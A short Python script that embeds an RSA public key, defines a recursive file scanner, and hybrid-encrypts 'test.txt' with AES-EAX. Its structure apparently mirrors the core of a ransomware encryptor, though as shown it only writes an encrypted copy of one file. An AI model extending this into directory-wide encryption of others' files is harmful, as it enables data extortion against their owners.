import base64
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

'''
with open('public.pem', 'rb') as f:
    public = f.read()
print(base64.b64encode(public))
'''

# public key with base64 encoding
pubKey = '''MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApQ/DiGBFb+knt6vRQ5TD
FJu3wy36wnJ19/QMOkVjGspop04YtNDB2DVtsKaJGRhdNp7n9cjaV0CLXkGn//vG
6FHSPjTzV4H9Q9k8EN7Tm4kuECQqMAQGCJNkOpFPedw/V1Y6yXh0JRRbWYWKvloE
U/FTx+U8Jd6WC/rr4bMydlSHy3o+ingGnEuRpGxKqCkEJB2NK8a9Afnxn1GRrZVb
k24w7PD55NEvwltkIbfFFIAYuXLWwRzKEXb3vYVVGRTSNvGgI3YycfvYvJ+Fdhuz
2ONneBuoxbhR2epekjZGbnT83LQb+BIVkkdWy6QgBA2jngG3w7L52RooU+g8MIfJ
xwIDAQAB'''
pubKey = base64.b64decode(pubKey)


def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


def encrypt(dataFile, publicKey):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    [ fileName, fileExtension ] = dataFile.split('.')
    encryptedFile = fileName + '_encrypted.' + fileExtension
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    print('Encrypted file saved to ' + encryptedFile)

fileName = 'test.txt'
encrypt(fileName, pubKey)